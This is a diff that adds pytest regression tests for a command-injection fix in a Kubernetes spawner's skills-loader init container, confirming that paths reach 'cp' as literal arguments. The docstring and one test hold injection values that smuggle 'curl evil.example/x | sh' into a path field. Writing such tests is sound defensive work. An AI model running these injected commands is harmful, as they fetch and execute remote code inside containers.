@@ -875,3 +875,150 @@ class TestKubernetesSpawnerMCPSecretMounts:
         assert (
             len(mcp_vol_calls) == 0
         ), "Expected no mcp-secret-* volumes when mcp_secret_mounts is None"
+
+
+class TestKubernetesSpawnerSkillsLoaderInjection:
+    """Tests for the skills-loader init container's copy command (issue #202).
+
+    Regression coverage for a command-injection finding (docs/CODE-REVIEW.md
+    #3): skills_paths is a request-supplied field with no validation, and
+    the copy command used to be built via shell string interpolation
+    (`sh -c " && ".join(f"cp -r {p} ...")`), letting a value like
+    `/skills; curl evil.sh | sh` execute inside the init container.
+    """
+
+    @pytest.mark.asyncio
+    async def test_skills_loader_uses_argv_cp_not_shell(self) -> None:
+        """The skills-loader init container's command is a plain argv cp, no shell."""
+        import sys
+
+        mock_batch = MagicMock()
+        mock_core = MagicMock()
+
+        mock_k8s_client = MagicMock()
+        mock_k8s_client.BatchV1Api.return_value = mock_batch
+        mock_k8s_client.CoreV1Api.return_value = mock_core
+        mock_k8s_config = MagicMock()
+
+        mock_k8s = MagicMock()
+        mock_k8s.client = mock_k8s_client
+        mock_k8s.config = mock_k8s_config
+
+        with patch.dict(
+            sys.modules,
+            {
+                "kubernetes": mock_k8s,
+                "kubernetes.client": mock_k8s_client,
+                "kubernetes.config": mock_k8s_config,
+            },
+        ):
+            spawner = KubernetesSpawner(namespace="default")
+            await spawner._do_spawn(
+                "skills-agent",
+                "agent-runtime:latest",
+                {},
+                skills_image="quay.io/example/skills:latest",
+                skills_paths=["/skills"],
+            )
+
+        container_calls = mock_k8s_client.V1Container.call_args_list
+        loader_calls = [c for c in container_calls if (c[1] or {}).get("name") == "skills-loader"]
+        assert len(loader_calls) == 1, "Expected exactly one skills-loader init container"
+        command = loader_calls[0][1]["command"]
+
+        assert "sh" not in command, "skills-loader must not invoke a shell"
+        assert "-c" not in command
+        assert command[0] == "cp"
+
+    @pytest.mark.asyncio
+    async def test_skills_loader_command_not_shell_interpolated_with_malicious_path(self) -> None:
+        """A skills_paths value with shell metacharacters is passed as a literal argv item.
+
+        Confirms the fix, not just its absence of "sh -c": the malicious
+        string must appear verbatim as a single argv element (which `cp`
+        would then fail to find as a literal filename), never split or
+        interpreted by a shell.
+        """
+        import sys
+
+        mock_batch = MagicMock()
+        mock_core = MagicMock()
+
+        mock_k8s_client = MagicMock()
+        mock_k8s_client.BatchV1Api.return_value = mock_batch
+        mock_k8s_client.CoreV1Api.return_value = mock_core
+        mock_k8s_config = MagicMock()
+
+        mock_k8s = MagicMock()
+        mock_k8s.client = mock_k8s_client
+        mock_k8s.config = mock_k8s_config
+
+        malicious_path = "/skills; curl evil.example/x | sh #"
+
+        with patch.dict(
+            sys.modules,
+            {
+                "kubernetes": mock_k8s,
+                "kubernetes.client": mock_k8s_client,
+                "kubernetes.config": mock_k8s_config,
+            },
+        ):
+            spawner = KubernetesSpawner(namespace="default")
+            await spawner._do_spawn(
+                "skills-agent-2",
+                "agent-runtime:latest",
+                {},
+                skills_image="quay.io/example/skills:latest",
+                skills_paths=[malicious_path],
+            )
+
+        container_calls = mock_k8s_client.V1Container.call_args_list
+        loader_calls = [c for c in container_calls if (c[1] or {}).get("name") == "skills-loader"]
+        command = loader_calls[0][1]["command"]
+
+        assert malicious_path in command, (
+            "The malicious string must appear as a single literal argv element"
+        )
+        assert not any("sh" == c or "-c" == c for c in command)
+
+    @pytest.mark.asyncio
+    async def test_skills_loader_handles_multiple_paths(self) -> None:
+        """Multiple skills_paths entries all appear as separate argv items to cp."""
+        import sys
+
+        mock_batch = MagicMock()
+        mock_core = MagicMock()
+
+        mock_k8s_client = MagicMock()
+        mock_k8s_client.BatchV1Api.return_value = mock_batch
+        mock_k8s_client.CoreV1Api.return_value = mock_core
+        mock_k8s_config = MagicMock()
+
+        mock_k8s = MagicMock()
+        mock_k8s.client = mock_k8s_client
+        mock_k8s.config = mock_k8s_config
+
+        with patch.dict(
+            sys.modules,
+            {
+                "kubernetes": mock_k8s,
+                "kubernetes.client": mock_k8s_client,
+                "kubernetes.config": mock_k8s_config,
+            },
+        ):
+            spawner = KubernetesSpawner(namespace="default")
+            await spawner._do_spawn(
+                "skills-agent-3",
+                "agent-runtime:latest",
+                {},
+                skills_image="quay.io/example/skills:latest",
+                skills_paths=["/skills-a", "/skills-b"],
+            )
+
+        container_calls = mock_k8s_client.V1Container.call_args_list
+        loader_calls = [c for c in container_calls if (c[1] or {}).get("name") == "skills-loader"]
+        command = loader_calls[0][1]["command"]
+
+        assert "/skills-a" in command
+        assert "/skills-b" in command
+        assert command[-1] == "/skills-data"
